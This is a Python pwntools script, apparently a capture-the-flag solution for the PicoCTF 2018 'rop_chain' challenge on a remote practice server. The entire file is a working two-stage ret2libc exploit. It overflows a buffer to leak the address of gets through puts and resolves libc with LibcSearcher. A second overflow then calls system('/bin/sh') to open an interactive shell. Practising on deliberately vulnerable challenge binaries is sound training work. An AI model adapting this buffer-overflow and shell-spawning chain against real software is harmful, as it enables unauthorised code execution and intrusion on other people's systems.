from pwn import *
from LibcSearcher import *

elf = ELF('./PicoCTF_2018_rop_chain')
r = remote('node3.buuoj.cn', 29427)
context.arch = 'i386'
vuln_func = 0x8048714

r.recvuntil('Enter your input> ')
r.sendline('a' * 0x1C + flat([elf.plt['puts'], vuln_func, elf.got['gets']]))
gets_addr = u32(r.recv(4))
r.recvline()
libc = LibcSearcher('gets', gets_addr)
libc_base = gets_addr - libc.dump('gets')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
exit_addr = libc_base + libc.dump('exit')
r.recvuntil('Enter your input> ')
r.sendline('a' * 0x1C + flat([system_addr, exit_addr, str_bin_sh]))
r.interactive()
